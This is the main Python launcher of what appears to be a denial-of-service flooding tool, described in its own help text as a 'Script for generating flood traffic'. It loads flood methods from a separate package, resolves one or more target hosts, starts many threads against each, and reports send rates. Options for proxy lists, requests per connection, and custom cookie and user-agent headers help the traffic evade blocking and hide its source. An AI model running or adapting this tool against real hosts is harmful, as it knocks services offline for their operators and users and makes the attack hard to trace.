#!/usr/bin/env python3
import argparse
import pkgutil
from importlib import import_module
from tool import humanize_bytes
from time import sleep
from os.path import exists
import json
from urllib.parse import urlparse
from socket import gethostbyname_ex

method_names = [name for _, name, _ in pkgutil.iter_modules(["methods"])]
DEFAULT_CONFIG_NAME = "./cfg/_default.json"


def host_parser(host_str: str) -> list:
    res = []
    last_host = ""
    for host in host_str.split(";"):
        try:
            b = host.split(":")
            r = {}
            if len(b) == 1:
                r["Host"] = b[0]
            elif len(b) == 2:
                if b[0] == "":
                    if last_host == "":
                        raise ValueError
                    r["Host"] = last_host
                else:
                    r["Host"] = b[0]
                r["Port"] = int(b[1])
            else:
                raise ValueError
            last_host = r["Host"]

            print(f"Fetching: {b[0]}...")
            a, b, c = gethostbyname_ex(b[0])
            r["Ip"] = c
            print(f"{a}: {c}")

            res.append(r)
        except ValueError:
            print(f"Warning: Cannot parse '{host}'!")

    return res


def job_factory(params: dict) -> list:
    method_module = import_module(f"methods.{params['Method']}")
    hosts_obj = []

    if params.get("Host") is None:
        params["Host"] = urlparse(params.get("Url")).netloc
        if not params.get("Host"):
            raise ValueError("Host/Url fetch error.")

    # Define host as [{'Host': 'value', 'Port': 123}, ...] object array
    if type(params.get("Host")) is list:
        hosts_obj = params.get("Host")
    # Define host as host:port[;host:port;...] string
    elif type(params.get("Host")) is str:
        hosts_obj = host_parser(params.get("Host"))

    jobs = []
    for obj in hosts_obj:
        threads = []
        for _ in range(0, params["Threads"]):
            t = method_module.Method({**params, **obj})
            threads.append(t)
        jobs.append({"name": f"{threads[0].params['Host']}:{threads[0].params['Port']}", "threads": threads})

    return jobs


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Script for generating flood traffic.")
    parser.add_argument("-host", "--Host", type=str,
                        help="Remote host <ip>:<port>[;<ip>:<port>;...] or json file.")
    parser.add_argument("-cfg", "--Config", type=str,
                        help="Config json file. Default '_<method>.json'.")
    parser.add_argument("-m", "--Method", type=str, choices=method_names, default="tcp",
                        help="Flood method|protocol")
    parser.add_argument("-t", "--Threads", type=int, default=1,
                        help="Thread count.")
    parser.add_argument("-url", "--Url", type=str,
                        help="Http url request [http[s]://<host>]/<path>")
    parser.add_argument("-norcv", "--NoReceive", action="store_true", default=False,
                        help="Do not receive data from socket.")
    parser.add_argument("-msg", "--Message", type=str,
                        help="Send message.")
    parser.add_argument("-thr", "--Throttle", type=int, default=0,
                        help="Throttle level [1...n]. 1 - maximum throttling.")
    parser.add_argument("-timeout", "--Timeout", type=int, default=10,
                        help="Socket timeout.")
    parser.add_argument("-proxy", "--Proxy", type=str,
                        help="Proxy server url, or file.")
    parser.add_argument("-rpc", "--RPC", type=int, default=1000,
                        help="Request per connect.")
    parser.add_argument("-cookie", "--Cookie", type=str,
                        help="Cookie header value.")
    parser.add_argument("-useragent", "--UserAgent", type=str,
                        help="User agent header value.")
    args = parser.parse_args()

    params = {}
    if exists(DEFAULT_CONFIG_NAME):
        with open(DEFAULT_CONFIG_NAME) as f:
            params = json.load(f)

    for attr, val in args.__dict__.items():
        if not (val is None):
            params[attr] = val

    if not params.get("Config"):
        params["Config"] = f"./cfg/_{params['Method']}.json"

    if params.get("Proxy") and exists(params.get("Proxy")):
        with open(params["Proxy"], encoding="utf-8") as f:
            params["Proxy"] = list(filter(lambda s: s, [line.strip() for line in f.readlines()]))

    jobs = []
    if exists(params["Config"]):
        with open(params["Config"]) as f:
            param_obj = json.load(f)
            j_list = []

            try:
                j_list = param_obj.pop("Jobs")
            except KeyError:
                pass

            params.update(param_obj)

            for job in j_list:
                new_params = params.copy()
                new_params.update(job)
                jobs += job_factory(new_params)

    if not jobs:
        try:
            jobs += job_factory(params)
        except ValueError as e:
            print(e)
            parser.print_help()
            exit(0)
    
    for job in jobs:
        for t in job["threads"]:
            t.start()

    try:
        while True:
            a_log = []
            for job in jobs:
                total_send = 0
                send_rate = 0
                send_count = 0
                send_count_rate = 0

                total_received = 0

                total_failed_count = 0
                e = None

                for thread in job["threads"]:
                    total_send += thread.sent_bytes
                    send_rate += thread.sent_rate
                    send_count += thread.sent_count
                    send_count_rate += thread.sent_count_rate

                    total_received += thread.received_bytes

                    total_failed_count += thread.failed_count

                    if e is None:
                        e = thread.last_error

                e = e or ""
                a_log.append("{}\tx{} TX:{} {}/s | {:.1f}kr {:.2f}r/s\tRX:{} F:{} {}".format(
                    f"[{job['threads'][0].__module__.split('.')[-1]}]{job['name']}", len(job["threads"]),
                    humanize_bytes(total_send), humanize_bytes(send_rate), send_count/1000, send_count_rate,
                    humanize_bytes(total_received),
                    total_failed_count, e))
            
            print("\n".join(a_log))
            sleep(2)

    except KeyboardInterrupt:
        print("Terminating...")
        for job in jobs:
            for thread in job["threads"]:
                thread.terminate()
